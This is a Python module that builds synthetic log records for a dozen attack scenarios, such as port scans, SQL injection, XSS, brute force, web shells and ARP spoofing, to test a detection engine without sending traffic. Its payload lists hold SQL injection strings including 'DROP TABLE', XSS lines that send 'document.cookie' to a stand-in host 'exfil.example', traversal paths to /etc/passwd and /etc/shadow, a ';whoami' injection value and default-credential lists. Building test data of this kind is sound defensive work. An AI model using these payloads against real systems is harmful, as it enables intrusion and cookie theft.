"""Synthetic attack scenarios.

SAFETY: every function here builds Python dictionaries that look like log
records. Nothing opens a socket, resolves a name, or touches a host. The
payload strings are the same ones a WAF signature would match, which is the
point — they exercise the detection engine end to end without any traffic
leaving the process.

A scenario returns the sequence of observations one attack episode would
produce. The stateful rules (port scan, brute force, DDoS) need the whole
sequence to cross their thresholds, which is why episodes are lists.
"""

from __future__ import annotations

import hashlib
import random
from collections.abc import Callable
from dataclasses import dataclass
from datetime import UTC, datetime

from ..detection.rules import Observation

# Target profile the scenario aims at: an asset from the seeded estate.
Target = dict


SCAN_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 465, 587, 993,
    995, 1080, 1433, 1521, 2049, 2375, 3000, 3306, 3389, 5432, 5601, 5900,
    6379, 8000, 8080, 8443, 9000, 9090, 9200, 11211, 27017,
]

USERNAMES = [
    "admin", "root", "administrator", "test", "oracle", "postgres", "ubuntu",
    "git", "jenkins", "backup", "guest", "user", "deploy", "ftpuser", "support",
]

PASSWORDS = ["123456", "admin", "password", "P@ssw0rd", "letmein", "qwerty", "root123"]

SQLI_PAYLOADS = [
    "1' OR '1'='1' -- ",
    "1 UNION ALL SELECT username,password,NULL FROM users -- ",
    "'; DROP TABLE sessions; -- ",
    "1' AND (SELECT SLEEP(5)) -- ",
    "-1' UNION SELECT table_name,NULL FROM information_schema.tables -- ",
    "admin'-- ",
]

XSS_PAYLOADS = [
    "<script>fetch('//exfil.example/'+document.cookie)</script>",
    "\"><img src=x onerror=alert(document.domain)>",
    "javascript:eval(atob('YWxlcnQoMSk='))",
    "<svg/onload=fetch('//exfil.example/'+document.cookie)>",
    "<iframe src=javascript:document.cookie></iframe>",
]

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fshadow",
    "....//....//windows/win.ini",
]

SCANNER_AGENTS = [
    "sqlmap/1.8.2#stable (https://sqlmap.org)",
    "Nikto/2.5.0",
    "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)",
    "gobuster/3.6",
    "Hydra v9.5",
]

BROWSER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "python-requests/2.32.3",
]

API_PATHS = [
    "/api/v1/products", "/api/v1/orders", "/api/v1/users", "/search",
    "/admin/login", "/wp-admin/admin-ajax.php", "/api/v1/invoices",
]

# The EICAR anti-malware test file: an industry-standard, inert string every
# scanner flags. It is not malware and cannot execute anything harmful.
EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
EICAR_SHA256 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"

WEBSHELL_NAMES = ["upload.php", "image.jpg.php", "shell.phtml", "backup.aspx", "cmd.jsp"]


def _now() -> str:
    return datetime.now(UTC).strftime("%d/%b/%Y:%H:%M:%S +0000")


def _syslog_now() -> str:
    return datetime.now(UTC).strftime("%b %d %H:%M:%S")


def _http_log(src: str, method: str, path: str, status: int, size: int, agent: str) -> str:
    return f'{src} - - [{_now()}] "{method} {path} HTTP/1.1" {status} {size} "-" "{agent}"'


def _base(src: str, target: Target, rng: random.Random) -> Observation:
    return {
        "source_ip": src,
        "source_port": rng.randint(32768, 60999),
        "destination_ip": target["ip"],
        "destination_port": target["port"],
        "protocol": target.get("protocol", "HTTPS"),
    }


# --------------------------------------------------------------------------
# Scenarios
# --------------------------------------------------------------------------
def port_scan(rng: random.Random, src: str, target: Target) -> list[Observation]:
    """SYN sweep across a wide port range — classic pre-exploitation recon."""
    ports = rng.sample(SCAN_PORTS, k=min(len(SCAN_PORTS), rng.randint(24, 36)))
    observations = []
    for port in ports:
        obs = _base(src, target, rng)
        obs.update(
            destination_port=port,
            protocol="TCP",
            packet_count=1,
            bytes=rng.randint(40, 60),
            tcp_flags="SYN",
            response_time_ms=rng.randint(1, 8),
            raw=(
                f"{_syslog_now()} fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC={src} "
                f"DST={target['ip']} PROTO=TCP SPT={obs['source_port']} DPT={port} "
                f"WINDOW=1024 SYN"
            ),
        )
        observations.append(obs)
    return observations


def sql_injection(rng: random.Random, src: str, target: Target) -> list[Observation]:
    """Parameter tampering with SQL grammar, usually via automated tooling."""
    observations = []
    for _ in range(rng.randint(1, 3)):
        payload = rng.choice(SQLI_PAYLOADS)
        path = f"{rng.choice(API_PATHS)}?id={payload}"
        agent = rng.choice(SCANNER_AGENTS if rng.random() < 0.6 else BROWSER_AGENTS)
        status = rng.choice([200, 500, 500, 403])
        obs = _base(src, target, rng)
        obs.update(
            method="GET",
            path=path,
            payload=payload,
            query_string=f"id={payload}",
            user_agent=agent,
            status_code=status,
            packet_count=rng.randint(1, 4),
            bytes=rng.randint(400, 2400),
            response_time_ms=rng.randint(60, 5200),
            raw=_http_log(src, "GET", path, status, rng.randint(200, 5000), agent),
        )
        observations.append(obs)
    return observations


def xss(rng: random.Random, src: str, target: Target) -> list[Observation]:
    """Reflected script injection into a user-rendered parameter."""
    observations = []
    for _ in range(rng.randint(1, 2)):
        payload = rng.choice(XSS_PAYLOADS)
        path = f"/search?q={payload}"
        agent = rng.choice(BROWSER_AGENTS)
        obs = _base(src, target, rng)
        obs.update(
            method="GET",
            path=path,
            payload=payload,
            query_string=f"q={payload}",
            user_agent=agent,
            status_code=200,
            packet_count=1,
            bytes=rng.randint(600, 3000),
            response_time_ms=rng.randint(20, 180),
            raw=_http_log(src, "GET", path, 200, rng.randint(600, 3000), agent),
        )
        observations.append(obs)
    return observations


def brute_force(rng: random.Random, src: str, target: Target) -> list[Observation]:
    """Credential stuffing against the web login form."""
    attempts = rng.randint(12, 28)
    agent = rng.choice(SCANNER_AGENTS)
    observations = []
    for _ in range(attempts):
        username = rng.choice(USERNAMES)
        obs = _base(src, target, rng)
        obs.update(
            method="POST",
            path="/api/v1/auth/login",
            username=username,
            auth_failure=True,
            status_code=401,
            user_agent=agent,
            event="login_failed",
            packet_count=1,
            bytes=rng.randint(180, 420),
            response_time_ms=rng.randint(80, 400),
            raw=_http_log(src, "POST", "/api/v1/auth/login", 401, 180, agent)
            + f' user="{username}" pass="{rng.choice(PASSWORDS)}"',
        )
        observations.append(obs)
    return observations


def ssh_login_failure(rng: random.Random, src: str, target: Target) -> list[Observation]:
    """sshd authentication failures — the most common internet background attack."""
    attempts = rng.randint(8, 22)
    observations = []
    for _ in range(attempts):
        username = rng.choice(USERNAMES)
        obs = _base(src, target, rng)
        obs.update(
            destination_port=22,
            protocol="SSH",
            username=username,
            auth_failure=True,
            event="failed_password",
            packet_count=rng.randint(2, 6),
            bytes=rng.randint(300, 900),
            response_time_ms=rng.randint(200, 2600),
            raw=(
                f"{_syslog_now()} {target.get('hostname', 'host')} sshd[{rng.randint(1000, 99999)}]: "
                f"Failed password for {'invalid user ' if rng.random() < 0.6 else ''}{username} "
                f"from {src} port {obs['source_port']} ssh2"
            ),
        )
        observations.append(obs)
    return observations


def ddos(rng: random.Random, src: str, target: Target) -> list[Observation]:
    """Volumetric flood from a rotating set of spoofed sources."""
    total = rng.randint(160, 320)
    observations = []
    for _ in range(total):
        # A real flood comes from a botnet — vary the source within a /16 so
        # the rule's distinct-source counter reflects reality.
        octets = src.split(".")
        flood_src = f"{octets[0]}.{octets[1]}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"
        obs = _base(flood_src, target, rng)
        obs.update(
            method="GET",
            path="/",
            user_agent=rng.choice(BROWSER_AGENTS),
            status_code=rng.choice([200, 503, 503, 504]),
            packet_count=rng.randint(400, 9000),
            bytes=rng.randint(1_000_000, 40_000_000),
            response_time_ms=rng.randint(1500, 30000),
            raw=(
                f"{_syslog_now()} lb01 haproxy[2211]: {flood_src}:{obs['source_port']} "
                f"[{_now()}] frontend~ backend/{target.get('hostname', 'web')} "
                f"0/0/-1/-1/30000 503 212 - - SC-- 8452/8452/0/0/3 0/0"
            ),
        )
        observations.append(obs)
    return observations


def malware_upload(rng: random.Random, src: str, target: Target) -> list[Observation]:
    """Upload of a file matching a known-malicious signature (EICAR test file)."""
    filename = rng.choice(["invoice.pdf.exe", "update.msi", "payload.bin", "report.docx.scr"])
    obs = _base(src, target, rng)
    obs.update(
        method="POST",
        path="/api/v1/files/upload",
        filename=filename,
        file_hash=EICAR_SHA256,
        payload=EICAR,
        content_type="application/x-msdownload",
        av_verdict="EICAR-Test-File",
        user_agent=rng.choice(BROWSER_AGENTS),
        status_code=201,
        packet_count=rng.randint(6, 40),
        bytes=rng.randint(60_000, 4_000_000),
        response_time_ms=rng.randint(300, 3000),
        raw=(
            f"{_syslog_now()} {target.get('hostname', 'host')} clamd[884]: "
            f"/var/uploads/{filename}: Eicar-Test-Signature FOUND"
        ),
    )
    return [obs]


def file_modification(rng: random.Random, src: str, target: Target) -> list[Observation]:
    """Web shell dropped into a served directory, then invoked."""
    filename = rng.choice(WEBSHELL_NAMES)
    digest = hashlib.sha256(filename.encode()).hexdigest()
    upload = _base(src, target, rng)
    upload.update(
        method="POST",
        path="/api/v1/files/upload",
        filename=filename,
        file_hash=digest,
        content_type="application/x-php",
        user_agent=rng.choice(SCANNER_AGENTS),
        status_code=201,
        packet_count=rng.randint(3, 12),
        bytes=rng.randint(1200, 24000),
        response_time_ms=rng.randint(120, 900),
        raw=(
            f"{_syslog_now()} {target.get('hostname', 'host')} auditd[701]: "
            f'type=PATH name="/var/www/html/uploads/{filename}" '
            f"nametype=CREATE mode=0755 sha256={digest[:16]}"
        ),
    )

    invoke = _base(src, target, rng)
    invoke.update(
        method="GET",
        path=f"/uploads/{filename}?cmd=;whoami",
        payload=";whoami",
        query_string="cmd=;whoami",
        user_agent=rng.choice(SCANNER_AGENTS),
        status_code=200,
        packet_count=rng.randint(1, 4),
        bytes=rng.randint(100, 900),
        response_time_ms=rng.randint(30, 400),
        raw=_http_log(src, "GET", f"/uploads/{filename}?cmd=;whoami", 200, 142, "curl/8.5.0"),
    )
    return [upload, invoke]


def directory_traversal(rng: random.Random, src: str, target: Target) -> list[Observation]:
    """Path escape attempting to read files outside the web root."""
    observations = []
    for _ in range(rng.randint(1, 3)):
        payload = rng.choice(TRAVERSAL_PAYLOADS)
        path = f"/download?file={payload}"
        agent = rng.choice(SCANNER_AGENTS)
        obs = _base(src, target, rng)
        obs.update(
            method="GET",
            path=path,
            payload=payload,
            query_string=f"file={payload}",
            user_agent=agent,
            status_code=rng.choice([200, 403, 404]),
            packet_count=1,
            bytes=rng.randint(200, 4000),
            response_time_ms=rng.randint(10, 200),
            raw=_http_log(src, "GET", path, 403, 199, agent),
        )
        observations.append(obs)
    return observations


def icmp_flood(rng: random.Random, src: str, target: Target) -> list[Observation]:
    """Ping flood consuming bandwidth on the target segment."""
    observations = []
    for _ in range(rng.randint(3, 8)):
        obs = _base(src, target, rng)
        obs.update(
            protocol="ICMP",
            destination_port=0,
            source_port=0,
            packet_count=rng.randint(80, 400),
            bytes=rng.randint(64_000, 900_000),
            response_time_ms=rng.randint(200, 4000),
            raw=(
                f"{_syslog_now()} fw01 kernel: [ICMP FLOOD] IN=eth0 SRC={src} "
                f"DST={target['ip']} PROTO=ICMP TYPE=8 CODE=0 LEN=1500"
            ),
        )
        observations.append(obs)
    return observations


def dns_amplification(rng: random.Random, src: str, target: Target) -> list[Observation]:
    """Spoofed ANY queries turning the resolver into a reflector."""
    observations = []
    for _ in range(rng.randint(2, 6)):
        request_size = rng.randint(40, 80)
        query_type = rng.choice(["ANY", "TXT", "DNSKEY"])
        query_name = rng.choice(["isc.org", "ripe.net", "peacecorps.gov"])
        obs = _base(src, target, rng)
        obs.update(
            protocol="UDP",
            destination_port=53,
            query_type=query_type,
            query_name=query_name,
            request_size=request_size,
            response_size=request_size * rng.randint(20, 70),
            spoofed_source=True,
            packet_count=rng.randint(40, 300),
            bytes=rng.randint(200_000, 4_000_000),
            response_time_ms=rng.randint(5, 60),
            raw=(
                f"{_syslog_now()} dns01 named[612]: client @0x7f {src}#{obs['source_port']} "
                f"query: {query_name} IN {query_type} +E(0)K (10.0.0.53)"
            ),
        )
        observations.append(obs)
    return observations


def arp_spoofing(rng: random.Random, src: str, target: Target) -> list[Observation]:
    """Gratuitous ARP re-binding the gateway IP to the attacker's MAC."""
    gateway = "10.0.0.1"

    def mac() -> str:
        return ":".join(f"{rng.randint(0, 255):02x}" for _ in range(6))

    legit, attacker = mac(), mac()
    observations = []
    for announced_mac, gratuitous in ((legit, False), (attacker, True), (attacker, True)):
        obs = _base(src, target, rng)
        obs.update(
            protocol="ARP",
            destination_port=0,
            source_port=0,
            announced_ip=gateway,
            mac_address=announced_mac,
            gratuitous=gratuitous,
            packet_count=1,
            bytes=42,
            raw=(
                f"{_syslog_now()} sw-core arpwatch: {'changed' if gratuitous else 'new'} "
                f"station {gateway} {announced_mac} (was {legit})"
            ),
        )
        observations.append(obs)
    return observations


@dataclass(frozen=True)
class Scenario:
    key: str
    name: str
    description: str
    expected_detection: str
    #: Preferred asset service; the runner picks a matching target when it can.
    service: str
    build: Callable[[random.Random, str, Target], list[Observation]]


SCENARIOS: dict[str, Scenario] = {
    s.key: s
    for s in [
        Scenario("port_scan", "Port Scan",
                 "Sweeps 24-36 distinct ports from one source, as nmap would before choosing a target.",
                 "Port Scan", "any", port_scan),
        Scenario("sql_injection", "SQL Injection",
                 "Sends tautology, UNION SELECT and time-based blind payloads through a query parameter.",
                 "SQL Injection", "http", sql_injection),
        Scenario("xss", "Cross-Site Scripting",
                 "Reflects script tags and event handlers back through a search parameter.",
                 "XSS", "http", xss),
        Scenario("brute_force", "Brute Force Login",
                 "12-28 failed logins against the web auth endpoint from a single source.",
                 "Brute Force Login", "http", brute_force),
        Scenario("ddos", "DDoS Flood",
                 "160-320 requests per burst from a rotating /16, with volumetric packet counts.",
                 "DDoS", "http", ddos),
        Scenario("ssh_login_failure", "SSH Login Failure",
                 "8-22 sshd authentication failures against port 22.",
                 "SSH Brute Force", "ssh", ssh_login_failure),
        Scenario("malware_upload", "Malware Upload",
                 "Uploads a file whose hash matches the EICAR anti-malware test signature.",
                 "Malware Upload", "http", malware_upload),
        Scenario("file_modification", "File Modification",
                 "Writes a web shell into a served directory, then invokes it with a command parameter.",
                 "Suspicious File Upload", "http", file_modification),
        Scenario("directory_traversal", "Directory Traversal",
                 "Requests dot-dot and encoded paths aiming at /etc/passwd and win.ini.",
                 "Directory Traversal", "http", directory_traversal),
        Scenario("icmp_flood", "ICMP Flood",
                 "Sustained echo-request volume far above diagnostic levels.",
                 "ICMP Flood", "any", icmp_flood),
        Scenario("dns_amplification", "DNS Amplification",
                 "Spoofed ANY/TXT queries producing 20-70x response amplification.",
                 "DNS Amplification", "dns", dns_amplification),
        Scenario("arp_spoofing", "ARP Spoofing",
                 "Gratuitous ARP replies rebinding the gateway address to a new MAC.",
                 "ARP Spoofing", "any", arp_spoofing),
    ]
}


if __name__ == "__main__":
    from ..detection.engine import DetectionEngine

    rng = random.Random(1337)
    target = {"ip": "10.0.0.20", "port": 443, "protocol": "HTTPS", "hostname": "web-prod-01"}

    for key, scenario in SCENARIOS.items():
        detector = DetectionEngine()  # fresh window state per scenario
        observations = scenario.build(rng, "185.220.101.42", target)
        assert observations, f"{key} produced no observations"
        assert all("raw" in o for o in observations), f"{key} missing raw log lines"

        detections = [d for o in observations if (d := detector.analyze(o))]
        assert detections, f"{key} produced no detection"
        types = {d.attack_type for d in detections}
        assert scenario.expected_detection in types, (
            f"{key}: expected {scenario.expected_detection}, engine saw {types}"
        )

    print(f"scenarios ok: {len(SCENARIOS)} scenarios all detected")
